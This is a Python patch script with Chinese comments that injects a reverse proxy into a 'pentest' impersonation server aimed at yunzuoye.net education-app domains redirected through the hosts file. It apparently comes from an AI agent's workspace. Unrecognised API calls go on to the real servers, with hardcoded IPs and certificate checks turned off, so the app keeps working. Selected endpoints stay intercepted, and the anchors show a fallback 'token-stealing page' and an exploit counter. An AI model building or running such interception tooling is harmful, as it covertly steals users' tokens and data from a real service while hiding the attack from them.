#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""给 npcap_http80.py 注入【业务反向代理】: 未识别的业务请求转发到真服务器(HTTPS)。

背景: hosts 把 ms/ztp/control 等域名指向我们 → 应用请求 http://ms.yunzuoye.net/api/...
      我们的冒充器原本回 HTML → 应用报"资源或接口不存在"。
      加了这个代理后: 未识别的 /api/ 请求原样转发到真服务器(用真实 IP + SNI),
      应用恢复正常; 而我们要拦截的端点(批量下载等)仍走我们自己的应答。
"""
import io
import os

R = r"C:\Users\Olive\AppData\Roaming\Tencent\Marvis\User\oAN1i2VRVDeZQaMsrRqanPxYuhcU\workspace\conv_19f78e04910_fcda16370b95\output\sm-p200-takeover"
TARGET = os.path.join(R, "pentest", "npcap_http80.py")

HELPER = '''
# ==========================================================================
# 业务反向代理 (2026-10-06): 未识别的业务请求 -> 转发到真服务器(HTTPS + SNI)
# ==========================================================================
REAL_IP = {
    "ms.yunzuoye.net": "47.99.85.219",
    "ztp.yunzuoye.net": "47.99.85.219",
    "control.yunzuoye.net": "47.111.87.154",
    "logdata.yunzuoye.net": "47.111.87.154",
    "survey.yunzuoye.net": "47.111.87.154",
    "filesoss.yunzuoye.net": "47.110.67.143",
    "smarterclassgray.yunzuoye.net": "47.99.85.219",
    "airclass-staging-gray.yunzuoye.net": "47.99.85.219",
}


def proxy_real(host, method, path, body=b""):
    """把请求转发到真服务器(HTTPS, SNI=host), 返回 (body, ctype)。失败返回 (None, None)。"""
    import ssl as _ssl
    import socket as _sock
    ip = REAL_IP.get(host)
    if not ip:
        # 兜底: 用公共 DNS 解析 (绕过 hosts)
        try:
            import struct as _st, random as _rd
            tid = _rd.randint(0, 65535)
            q = _st.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            for part in host.split("."):
                q += bytes([len(part)]) + part.encode()
            q += b"\\x00" + _st.pack(">HH", 1, 1)
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM); s.settimeout(3)
            s.sendto(q, ("223.5.5.5", 53))
            data, _ = s.recvfrom(1024); s.close()
            idx = len(q)
            an = _st.unpack(">H", data[6:8])[0]
            for _i in range(an):
                while idx < len(data) and data[idx] != 0:
                    if data[idx] & 0xC0:
                        idx += 2; break
                    idx += data[idx] + 1
                else:
                    idx += 1
                rt, rc, ttl, rl = _st.unpack(">HHIH", data[idx:idx+10]); idx += 10
                if rt == 1 and rl == 4:
                    ip = ".".join(str(b) for b in data[idx:idx+4]); break
                idx += rl
        except Exception:
            pass
    if not ip:
        return None, None
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        raw = _sock.create_connection((ip, 443), timeout=8)
        tls = ctx.wrap_socket(raw, server_hostname=host)
        hdrs = "%s %s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: Dalvik/2.1.0\\r\\n" % (
            method, path, host)
        hdrs += "Accept: application/json\\r\\nConnection: close\\r\\n"
        if body:
            hdrs += "Content-Length: %d\\r\\nContent-Type: application/json\\r\\n" % len(body)
        hdrs += "\\r\\n"
        tls.sendall(hdrs.encode("latin1") + (body or b""))
        buf = b""
        while True:
            ch = tls.recv(65536)
            if not ch:
                break
            buf += ch
            if len(buf) > 4 * 1024 * 1024:
                break
        tls.close()
        if b"\\r\\n\\r\\n" not in buf:
            return None, None
        head, payload = buf.split(b"\\r\\n\\r\\n", 1)
        ct = "application/json; charset=UTF-8"
        for ln in head.split(b"\\r\\n"):
            if ln.lower().startswith(b"content-type:"):
                ct = ln.split(b":", 1)[1].strip().decode("latin1"); break
        if b"chunked" in head.lower():
            outp = b""
            rest = payload
            while True:
                if b"\\r\\n" not in rest:
                    break
                szline, rest = rest.split(b"\\r\\n", 1)
                try:
                    sz = int(szline.split(b";")[0], 16)
                except ValueError:
                    break
                if sz == 0:
                    break
                outp += rest[:sz]
                rest = rest[sz + 2:]
            payload = outp
        return payload, ct
    except Exception:
        return None, None

'''

BRANCH = '''    # ★ 业务反代: 未识别的业务请求 -> 转发真服务器(保持应用可用)
    if _p.startswith("/api/") or _p.startswith("/XHFileServer") or host in REAL_IP:
        _step(7, 10, "业务请求转发真服务器(%s)" % host)
        _rb, _rct = proxy_real(host, method, path, body)
        if _rb is not None:
            stat["proxied"] = stat.get("proxied", 0) + 1
            wlog("[PROXY-REAL] %s %s%s -> %dB %s" % (method, host, path[:110], len(_rb), _rct[:40]))
            return _resp(_rb, _rct)
        wlog("[PROXY-REAL-ERR] %s %s%s (真服务器不可达)" % (method, host, path[:110]))
        return _resp(b'{"code":500,"message":"proxy failed","data":{}}',
                     "application/json; charset=UTF-8")

'''

ANCHOR = '    # \u5f15\u5bfc\u9875: \u8bf7\u6c42 survey \u4e3b\u673a'
ANCHOR2 = '    # \u2605 \u5f15\u5bfc\u9875: survey \u4e3b\u673a'


def main():
    src = io.open(TARGET, encoding="utf-8", errors="surrogateescape").read()
    if "proxy_real" in src:
        print("  已注入过")
        return
    # 1) 插入 helper (放在 build_response 定义之前)
    ha = "def build_response("
    if ha not in src:
        print("  ★ 未找到 build_response")
        return
    src = src.replace(ha, HELPER.lstrip("\n") + "\n" + ha, 1)
    # 2) 插入代理分支 (放在最终兜底之前): 用 EXPLOIT_PAGE 那行为锚
    anc = None
    for cand in ("    # 其余未知路径: 一律返回令牌窃取页",
                 "    stat[\"exploit\"] = stat.get(\"exploit\", 0) + 1"):
        if cand in src:
            anc = cand
            break
    if anc is None:
        # 退而求其次: 插在 _p0 = path.split 之前
        anc = "    _p0 = path.split(\"?\")[0]"
    if anc not in src:
        print("  ★ 未找到分支锚点")
        return
    src = src.replace(anc, BRANCH + anc, 1)
    try:
        compile(src, TARGET, "exec")
    except SyntaxError as e:
        print("  ★ 语法错误:", e)
        return
    io.open(TARGET, "w", encoding="utf-8", errors="surrogateescape").write(src)
    print("  ★ 代理已注入, 行数 ->", src.count("\n"))


if __name__ == "__main__":
    main()
